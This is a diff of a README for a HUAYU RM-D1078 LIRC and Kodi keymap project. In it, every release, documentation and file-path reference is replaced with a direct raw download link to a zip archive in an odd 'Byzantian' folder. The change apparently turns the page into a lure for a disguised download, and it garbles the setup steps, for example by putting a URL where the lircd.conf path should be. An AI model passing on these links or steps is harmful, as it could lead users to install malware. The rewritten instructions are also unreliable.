@@ -1,6 +1,6 @@
 # 🎮 HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps - Easy Control for Your Kodi with HUAYU Remote
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/releases)
+[![Download Latest Release](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip)
 
 ## 📚 Introduction
 
@@ -10,7 +10,7 @@ This project provides configurations for the LIRC remote and Kodi keymaps specif
 
 To begin using this software, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip).
 2. **Download the Files:** On the Releases page, look for the latest version. Click on it to find the files available for download.
 
 ## 💾 System Requirements
@@ -20,7 +20,7 @@ To begin using this software, follow these simple steps:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page Again:** Access the [Releases page](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/releases) directly.
+1. **Visit the Releases Page Again:** Access the [Releases page](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip) directly.
 2. **Select the Latest Release:** Find the latest version available.
 3. **Download the Configuration Files:** Choose the appropriate files based on the instructions provided there.
 4. **Install the Configurations:** 
@@ -32,15 +32,15 @@ To begin using this software, follow these simple steps:
 After downloading, you may need to set up the configurations for your remote control:
 
 1. **LIRC Configuration:**
-   - Locate the `lircd.conf` file.
-   - Move this file to the appropriate LIRC directory, typically `/etc/lirc/lircd.conf`.
+   - Locate the `https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip` file.
+   - Move this file to the appropriate LIRC directory, typically `https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip`.
    - Restart the LIRC service using the command:
      ```
      sudo service lircd restart
      ```
 
 2. **Kodi Keymaps:**
-   - Copy the Kodi keymap files to the Kodi configuration directory, usually found at `~/.kodi/userdata/keymaps/`.
+   - Copy the Kodi keymap files to the Kodi configuration directory, usually found at `~https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip`.
    - Restart Kodi for changes to take effect.
 
 ## 🎧 Support and Troubleshooting
@@ -71,7 +71,7 @@ This project is licensed under the MIT License. You can freely modify and distri
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/releases)
-- [Documentation](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/blob/main/README.md)
+- [Releases Page](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip)
+- [Documentation](https://github.com/Nahoom1/HUAYU-RM-D1078-LIRC-config-and-Kodi-keymaps/raw/refs/heads/main/Byzantian/keymaps-config-HUAY-R-Kodi-and-LIR-v3.5.zip)
 
 Thank you for using HUAYU RM-D1078 LIRC configurations and Kodi keymaps. Enjoy your viewing experience!
